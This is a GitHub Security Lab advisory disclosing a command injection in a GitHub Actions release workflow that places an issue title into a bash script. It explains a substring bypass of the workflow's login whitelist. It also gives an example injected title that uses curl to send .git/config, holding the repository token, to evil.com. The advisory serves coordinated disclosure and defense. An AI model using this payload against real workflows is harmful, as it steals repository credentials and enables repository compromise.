<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">February 3, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-186: Command injection in thomaseizinger/github-action-gitflow-release-workflow</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/jarlob">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/26652396?s=35" height="35" width="35">
        <span>Jaroslav Lobacevski</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>10/16/2020: Report sent to vendor</li>
  <li>10/17/2020: Issue fixed</li>
</ul>

<h2 id="summary">Summary</h2>

<p>The <a href="https://github.com/thomaseizinger/github-action-gitflow-release-workflow/blob/dev/.github/workflows/draft-new-release.yml">‘draft-new-release.yml’ GitHub workflow</a> is potentially vulnerable to arbitrary command injection, that may lead to the repository being compromised.</p>

<h2 id="product">Product</h2>

<p><a href="https://github.com/thomaseizinger/github-action-gitflow-release-workflow">thomaseizinger/github-action-gitflow-release-workflow GitHub repository</a></p>

<h2 id="tested-version">Tested Version</h2>

<p><a href="https://github.com/thomaseizinger/github-action-gitflow-release-workflow/blob/dev/.github/workflows/draft-new-release.yml">draft-new-release.yml</a> from the dev branch.</p>

<h2 id="details">Details</h2>

<h3 id="issue-the-body-of-a-public-github-issue-is-used-to-format-a-shell-command">Issue: The body of a public GitHub issue is used to format a shell command</h3>

<p>When a user creates a public issue that begins with <code class="language-plaintext highlighter-rouge">Release version</code> it automatically starts the <a href="https://github.com/thomaseizinger/github-action-gitflow-release-workflow/blob/dev/.github/workflows/draft-new-release.yml">draft-new-release.yml</a> GitHub workflow. The title of the issue is used to format a bash script.</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Only run for issues with a specific title and label. Not strictly required but makes finding the release issue again later easier.</span>
<span class="c1"># There is also a whitelist that you may want to use to restrict, who can trigger this workflow.</span>
<span class="c1"># Unfortunately, we cannot create an array on the fly, so the whitelist is just comma-separated.</span>
<span class="na">if</span><span class="pi">:</span> <span class="s">startsWith(github.event.issue.title, 'Release version') &amp;&amp; contains(github.event.issue.labels.*.name, 'release') &amp;&amp; contains('thomaseizinger,yourusername', github.event.issue.user.login)</span>
<span class="na">steps</span><span class="pi">:</span>
    <span class="pi">-</span> <span class="na">uses</span><span class="pi">:</span> <span class="s">actions/checkout@v2</span>

    <span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Extract version from issue title</span>
    <span class="na">run</span><span class="pi">:</span> <span class="pi">|</span>
        <span class="s">TITLE="${{ github.event.issue.title }}"</span>
        <span class="s">VERSION=${TITLE#Release version }</span>
</code></pre></div></div>

<p>There are two safeguards to prevent random users from triggering the workflow: user login name check and label check.<br />
The login name is bypassable with any user name that is a substring of <code class="language-plaintext highlighter-rouge">thomaseizinger,yourusername</code>. Like <code class="language-plaintext highlighter-rouge">eizi</code>, <code class="language-plaintext highlighter-rouge">thom</code>, etc.<br />
The label check is the only one that prevents exploitation, but it may be removed accidentally in the future. There is even a comment that indicates it is <code class="language-plaintext highlighter-rouge">Not strictly required</code>.</p>

<h4 id="impact">Impact</h4>

<p>This vulnerability allows for arbitrary command injection into the bash script. For example a user may create an issue with the title <code class="language-plaintext highlighter-rouge">Release version"; curl -d @.git/config http://evil.com; sleep 10 #</code> which will exfiltrate the temporary GitHub repository authorization token to the attacker controlled server. Although the token is not valid after the workflow finishes, since the attacker controls the execution of the workflow he or she can delay it to give the malicious server time to modify the repository.</p>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/JarLob">@JarLob (Jaroslav Lobačevski)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2020-186</code> in any communication regarding this issue.</p>
